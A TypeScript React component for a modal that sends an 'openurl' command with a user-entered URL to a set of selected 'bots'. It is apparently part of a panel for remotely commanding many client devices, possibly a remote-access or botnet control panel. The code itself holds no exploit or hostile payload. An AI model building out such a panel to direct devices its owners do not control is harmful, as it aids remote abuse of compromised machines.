import React from "react";
import {ModalWithSelectedBotsProps} from "../../../Model/Modal";
import {Form, Input, Modal} from "antd";
import {getBotsId} from "../../../Util/getBotIds";
import {inputRules} from "../../../Util/config";
import sendCommand from "../../../Requests/Commands/sendCommands";
import {useTranslation} from "react-i18next";

const OpenURL: React.FC<ModalWithSelectedBotsProps> = (props: ModalWithSelectedBotsProps) => {
    const [form] = Form.useForm();
    const closeModal = () => {
        props.setVisible(false);
        form.resetFields();
    };
    const formSubmit = () => {
        sendCommand({
            command: "openurl",
            payload: form.getFieldsValue(),
            botIds: getBotsId(props.selectedBots),
        });

        closeModal();
    };

    const {t} = useTranslation();

    return (
        <Modal
            title={t("OPEN_URL_COMMAND")}
            open={props.visible}
            onCancel={closeModal}
            onOk={() => form.submit()}
            okText={t("OPEN_URL_COMMAND")}
            cancelText={t("MODAL_BUTTON_CANCEL")}
            width={340}
            destroyOnClose
        >
            <Form form={form} layout="vertical" onFinish={formSubmit}>
                <Form.Item label={t("SITE_URL")} name="url" rules={inputRules}>
                    <Input placeholder="https://enter.website/" />
                </Form.Item>
            </Form>
        </Modal>
    );
};

export default OpenURL;
